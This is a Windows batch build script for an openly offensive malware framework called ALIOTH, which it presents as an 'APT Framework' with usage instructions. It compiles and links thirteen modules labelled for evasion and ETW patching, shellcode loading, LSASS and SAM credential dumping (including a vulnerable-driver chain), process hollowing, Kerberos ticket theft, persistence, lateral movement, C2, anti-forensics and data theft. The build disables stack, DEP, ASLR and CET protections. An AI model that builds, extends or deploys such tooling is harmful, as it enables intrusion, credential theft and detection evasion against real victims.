@echo off
REM ============================================================
REM ALIOTH APT Framework — Build System v3.0
REM Author: sn0x
REM ============================================================
setlocal enabledelayedexpansion

echo [*] ==============================================
echo [*] ALIOTH APT Framework Build System
echo [*] ==============================================
echo.

REM Parse argument for stub count
set STUB_COUNT=1024
if not "%1"=="" set STUB_COUNT=%1

echo [*] Step 1: Building ALIOTH Core Engine...
cd core
echo [*]   Generating %STUB_COUNT% polymorphic stubs...
py generate_stubs.py %STUB_COUNT%
if %errorlevel% neq 0 (
    echo [!] Stub generation failed
    pause
    exit /b %errorlevel%
)

echo [*]   Assembling MASM64 core...
ml64 /c /Cx /nologo syscalls_base.asm
if %errorlevel% neq 0 (
    echo [!] Assembly failed
    pause
    exit /b %errorlevel%
)

echo [*]   Compiling core C sources...
cl /nologo /c /O1 /GS- /GF- /Gy /I. engine.c etw_patch.c hwbp_check.c random_mask.c decoy_threads.c utils.c
if %errorlevel% neq 0 (
    echo [!] Core compilation failed
    pause
    exit /b %errorlevel%
)

echo.
echo [*] Step 2: Building All 13 Modes...

REM Mode 1: Umbra
echo [*]   Mode 1 - Umbra (Evasion Engine)...
cd ..\modes\umbra
cl /nologo /c /O1 /GS- /GF- /Gy /I..\..\core umbra_demo.c
cd ..\..

REM Mode 2: Charon
echo [*]   Mode 2 - Charon (Shellcode Loader)...
cd modes\charon
cl /nologo /c /O1 /GS- /GF- /Gy /I..\..\core charon.c
cd ..\..

REM Mode 3: Wraith
echo [*]   Mode 3 - Wraith (LSASS Dumper)...
cd modes\wraith
cl /nologo /c /O1 /GS- /GF- /Gy /I..\..\core wraith.c byovd_chain.c driverless_read.c dump_encrypt.c
cd ..\..

REM Mode 4: Revenant
echo [*]   Mode 4 - Revenant (Process Hollowing)...
cd modes\revenant
cl /nologo /c /O1 /GS- /GF- /Gy /I..\..\core revenant.c
cd ..\..

REM Mode 5: Mortis
echo [*]   Mode 5 - Mortis (MiniDump)...
cd modes\mortis
cl /nologo /c /O1 /GS- /GF- /Gy /I..\..\core mortis.c
cd ..\..

REM Mode 6: Shadow
echo [*]   Mode 6 - Shadow (VSS SAM Dumper)...
cd modes\shadow
cl /nologo /c /O1 /GS- /GF- /Gy /I..\..\core shadow.c
cd ..\..

REM Mode 7: Hermes
echo [*]   Mode 7 - Hermes (Kerberos TGT)...
cd modes\hermes
cl /nologo /c /O1 /GS- /GF- /Gy /I..\..\core hermes.c
cd ..\..

REM Mode 8: Eos
echo [*]   Mode 8 - Eos (Persistence Engine)...
cd modes\eos
cl /nologo /c /O1 /GS- /GF- /Gy /I..\..\core eos.c
cd ..\..

REM Mode 9: Helios
echo [*]   Mode 9 - Helios (Lateral Movement)...
cd modes\helios
cl /nologo /c /O1 /GS- /GF- /Gy /I..\..\core helios.c
cd ..\..

REM Mode 10: Nyx
echo [*]   Mode 10 - Nyx (C2 Communication)...
cd modes\nyx
cl /nologo /c /O1 /GS- /GF- /Gy /I..\..\core nyx.c
cd ..\..

REM Mode 11: Acheron
echo [*]   Mode 11 - Acheron (Anti-Forensics)...
cd modes\acheron
cl /nologo /c /O1 /GS- /GF- /Gy /I..\..\core acheron.c
cd ..\..

REM Mode 12: Lachesis
echo [*]   Mode 12 - Lachesis (Data Theft)...
cd modes\lachesis
cl /nologo /c /O1 /GS- /GF- /Gy /I..\..\core lachesis.c
cd ..\..

REM Mode 13: Tartarus
echo [*]   Mode 13 - Tartarus (Full Auto APT)...
cd modes\tartarus
cl /nologo /c /O1 /GS- /GF- /Gy /I..\..\core tartarus.c
cd ..\..

echo.
echo [*] Step 3: Linking ALIOTH.exe...
cd ..
cl /nologo main.c /O1 /GS- /GF- /Gy /Icore /Fe:ALIOTH.exe ^
    core\engine.obj core\etw_patch.obj core\hwbp_check.obj core\random_mask.obj core\decoy_threads.obj core\utils.obj core\syscalls_base.obj ^
    modes\umbra\umbra_demo.obj ^
    modes\charon\charon.obj ^
    modes\wraith\wraith.obj modes\wraith\byovd_chain.obj modes\wraith\driverless_read.obj modes\wraith\dump_encrypt.obj ^
    modes\revenant\revenant.obj ^
    modes\mortis\mortis.obj ^
    modes\shadow\shadow.obj ^
    modes\hermes\hermes.obj ^
    modes\eos\eos.obj ^
    modes\helios\helios.obj ^
    modes\nyx\nyx.obj ^
    modes\acheron\acheron.obj ^
    modes\lachesis\lachesis.obj ^
    modes\tartarus\tartarus.obj ^
    /link /CETCOMPAT:NO /SUBSYSTEM:CONSOLE /NXCOMPAT:NO /DYNAMICBASE:NO

if %errorlevel% equ 0 (
    echo.
    echo [+] ==============================================
    echo [+] SUCCESS: ALIOTH.exe built
    echo [+] All 13 modes compiled and linked
    echo [+] Stubs: %STUB_COUNT%
    echo [+] ==============================================
    echo.
    echo [*] Usage: ALIOTH.exe
    echo [*]   Interactive mode (no arguments)
    echo [*] Or: ALIOTH.exe --mode 13 (Full Auto APT)
    echo.
) else (
    echo.
    echo [!] ==============================================
    echo [!] BUILD FAILED
    echo [!] ==============================================
    echo.
    pause
    exit /b %errorlevel%
)

echo [*] Cleaning intermediate files...
del /s *.obj >nul 2>&1
del core\syscalls.asm >nul 2>&1

echo [*] Done.
pause
